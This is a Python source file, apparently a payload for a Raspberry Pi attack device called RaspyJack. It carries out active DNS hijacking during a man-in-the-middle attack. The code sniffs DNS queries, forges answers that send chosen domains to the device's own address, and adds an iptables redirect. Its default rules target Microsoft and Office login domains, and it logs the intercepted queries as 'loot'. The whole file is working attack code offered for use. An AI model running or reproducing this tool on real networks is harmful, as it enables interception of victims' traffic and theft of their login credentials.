#!/usr/bin/env python3
"""
RaspyJack Payload -- DNS Hijack
================================
Author: 7h30th3r0n3

Active DNS hijacking during MITM.  Sniffs DNS queries (UDP 53) on the
active interface, responds with spoofed IPs for configured domains, and
forwards all others to the real DNS server (transparent proxy).

Supports domain-to-IP mappings and wildcard patterns (*.example.com).
Works best during an active MITM (e.g. arp_mitm payload).

Controls:
  OK         -- Start / Stop hijacking
  UP / DOWN  -- Scroll intercepted domains
  KEY1       -- Add / remove domain from spoof list
  KEY2       -- Export intercepted log
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/DNSHijack/
"""

import os
import sys
import time
import json
import struct
import socket
import fnmatch
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR,
        sendp, sniff as scapy_sniff, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/DNSHijack"
os.makedirs(LOOT_DIR, exist_ok=True)

ROWS_VISIBLE = 5
REAL_DNS = "8.8.8.8"

# Default spoof rules: domain pattern -> IP
DEFAULT_SPOOF_RULES = {
    "*.example.com": "AUTO",   # AUTO = use Pi's IP
    "login.microsoft.com": "AUTO",
    "portal.office.com": "AUTO",
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
hijacking = False
spoof_rules = dict(DEFAULT_SPOOF_RULES)
intercepted = []       # list of {"ts", "src", "domain", "spoofed", "original"}
scroll_pos = 0
selected_idx = 0
queries_total = 0
spoofed_count = 0
status_msg = "Ready"
my_iface = "eth0"
my_ip = "0.0.0.0"

_hijack_thread = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run_silent(cmd, timeout=5):
    """Run command ignoring errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


def _get_real_dns():
    """Get the system's configured DNS server."""
    try:
        with open("/etc/resolv.conf") as fh:
            for line in fh:
                line = line.strip()
                if line.startswith("nameserver"):
                    addr = line.split()[1]
                    if addr != "127.0.0.1":
                        return addr
    except Exception:
        pass
    return REAL_DNS


def _resolve_real(domain, dns_server):
    """Forward DNS query to real DNS server."""
    try:
        # Build minimal DNS query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        txid = struct.pack("!H", 0x1234)
        flags = struct.pack("!H", 0x0100)  # standard query
        counts = struct.pack("!HHHH", 1, 0, 0, 0)
        # Encode domain name
        qname = b""
        for part in domain.rstrip(".").split("."):
            qname += struct.pack("!B", len(part)) + part.encode()
        qname += b"\x00"
        qtype = struct.pack("!HH", 1, 1)  # A record, IN class
        query = txid + flags + counts + qname + qtype
        sock.sendto(query, (dns_server, 53))
        data, _ = sock.recvfrom(512)
        sock.close()
        # Parse answer (minimal): skip header(12) + question, find first A record
        if len(data) > 12:
            ancount = struct.unpack("!H", data[6:8])[0]
            if ancount > 0:
                # Skip question section
                offset = 12
                while offset < len(data) and data[offset] != 0:
                    offset += data[offset] + 1
                offset += 5  # null + qtype + qclass
                # Parse first answer
                if offset + 12 <= len(data):
                    # Skip name (pointer or labels)
                    if data[offset] & 0xC0 == 0xC0:
                        offset += 2
                    else:
                        while offset < len(data) and data[offset] != 0:
                            offset += data[offset] + 1
                        offset += 1
                    if offset + 10 <= len(data):
                        rdlength = struct.unpack("!H", data[offset + 8:offset + 10])[0]
                        if rdlength == 4 and offset + 10 + 4 <= len(data):
                            ip_bytes = data[offset + 10:offset + 14]
                            return ".".join(str(b) for b in ip_bytes)
    except Exception:
        pass
    return None


def _matches_spoof(domain, rules):
    """Check if domain matches any spoof rule, return IP or None."""
    domain = domain.rstrip(".").lower()
    for pattern, ip in rules.items():
        if fnmatch.fnmatch(domain, pattern.lower()):
            return ip
    return None


# ---------------------------------------------------------------------------
# iptables setup
# ---------------------------------------------------------------------------

def _setup_iptables():
    """Redirect DNS traffic to us using iptables."""
    _run_silent([
        "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
        "-i", my_iface, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])


def _cleanup_iptables():
    """Remove DNS redirect rules."""
    _run_silent([
        "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
        "-i", my_iface, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])


# ---------------------------------------------------------------------------
# DNS hijack thread
# ---------------------------------------------------------------------------

def _hijack_loop():
    """Sniff DNS queries and respond with spoofed or real answers."""
    global queries_total, spoofed_count

    real_dns = _get_real_dns()

    def _process_pkt(pkt):
        if not running or not hijacking:
            return
        if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return
        if pkt[DNS].qr != 0:
            return  # skip responses
        if not pkt.haslayer(IP):
            return

        domain = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
        src_ip = pkt[IP].src

        with lock:
            nonlocal_queries = queries_total + 1
            rules = dict(spoof_rules)

        with lock:
            queries_total = nonlocal_queries

        spoof_ip = _matches_spoof(domain, rules)

        if spoof_ip is not None:
            # Resolve AUTO to our IP
            target_ip = my_ip if spoof_ip == "AUTO" else spoof_ip

            try:
                reply = (
                    IP(src=pkt[IP].dst, dst=src_ip)
                    / UDP(sport=53, dport=pkt[UDP].sport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1, rd=1, ra=1,
                        qdcount=1, ancount=1,
                        qd=pkt[DNSQR],
                        an=DNSRR(
                            rrname=pkt[DNSQR].qname,
                            type="A", rclass="IN",
                            ttl=60,
                            rdata=target_ip,
                        ),
                    )
                )
                sendp(
                    Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / reply,
                    iface=my_iface, verbose=False,
                )

                with lock:
                    spoofed_count += 1
                    intercepted.append({
                        "ts": datetime.now().strftime("%H:%M:%S"),
                        "src": src_ip,
                        "domain": domain,
                        "spoofed": target_ip,
                        "original": "",
                    })
            except Exception:
                pass
        else:
            # Forward to real DNS and record
            real_ip = _resolve_real(domain, real_dns)
            with lock:
                intercepted.append({
                    "ts": datetime.now().strftime("%H:%M:%S"),
                    "src": src_ip,
                    "domain": domain,
                    "spoofed": "",
                    "original": real_ip or "?",
                })

    try:
        scapy_sniff(
            iface=my_iface,
            filter="udp port 53",
            prn=_process_pkt,
            store=False,
            stop_filter=lambda _: not running or not hijacking,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_log():
    """Export intercepted queries to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "queries_total": queries_total,
            "spoofed_count": spoofed_count,
            "spoof_rules": dict(spoof_rules),
            "intercepted": [dict(e) for e in intercepted],
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"dns_hijack_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "DNS HIJACK", fill="RED", font=font)

    with lock:
        st = status_msg
        hj = hijacking
        sp = scroll_pos
        si = selected_idx
        qt = queries_total
        sc = spoofed_count
        inter_list = list(intercepted)
        rules_count = len(spoof_rules)

    hj_label = "ON" if hj else "OFF"
    hj_color = "GREEN" if hj else "GRAY"
    draw.text((80, 2), hj_label, fill=hj_color, font=font)

    draw.text((2, 14), st[:22], fill="WHITE", font=font)
    draw.text((2, 26), f"Queries:{qt} Spoofed:{sc}", fill="WHITE", font=font)
    draw.text((2, 38), f"Rules: {rules_count}", fill="YELLOW", font=font)

    # Intercepted queries list
    y = 52
    visible = inter_list[sp:sp + ROWS_VISIBLE]
    for i, entry in enumerate(visible):
        real_i = sp + i
        prefix = ">" if real_i == si else " "
        color = "RED" if entry.get("spoofed") else "WHITE"
        if real_i == si:
            color = "YELLOW"
        domain = entry.get("domain", "?")
        line = f"{prefix}{domain[:20]}"
        draw.text((2, y), line, fill=color, font=font)
        y += 14

    if not visible:
        draw.text((2, 60), "No queries yet", fill="GRAY", font=font)

    # Footer
    draw.text((2, 116), "OK:Hijack K1:Rule K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, hijacking, scroll_pos, selected_idx, status_msg
    global my_iface, my_ip, _hijack_thread, spoof_rules

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        my_iface = _get_default_iface()
        my_ip = _get_iface_ip(my_iface)

        with lock:
            # Replace AUTO in default rules with our IP for display
            status_msg = f"Iface: {my_iface} ({my_ip})"

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    hijacking = not hijacking
                if hijacking:
                    _setup_iptables()
                    with lock:
                        status_msg = "Hijacking active"
                    _hijack_thread = threading.Thread(
                        target=_hijack_loop, daemon=True,
                    )
                    _hijack_thread.start()
                else:
                    _cleanup_iptables()
                    with lock:
                        status_msg = "Hijacking stopped"
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if selected_idx > 0:
                        selected_idx -= 1
                    if selected_idx < scroll_pos:
                        scroll_pos = selected_idx

            elif btn == "DOWN":
                with lock:
                    if selected_idx < len(intercepted) - 1:
                        selected_idx += 1
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        scroll_pos = selected_idx - ROWS_VISIBLE + 1

            elif btn == "KEY1":
                # Toggle spoof rule for selected domain
                with lock:
                    if 0 <= selected_idx < len(intercepted):
                        domain = intercepted[selected_idx].get("domain", "")
                        if domain:
                            if domain in spoof_rules:
                                del spoof_rules[domain]
                                status_msg = f"Removed: {domain[:14]}"
                            else:
                                spoof_rules[domain] = "AUTO"
                                status_msg = f"Added: {domain[:16]}"
                time.sleep(0.3)

            elif btn == "KEY2":
                threading.Thread(target=_export_log, daemon=True).start()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        hijacking = False

        _cleanup_iptables()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "DNS Hijack stopped", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
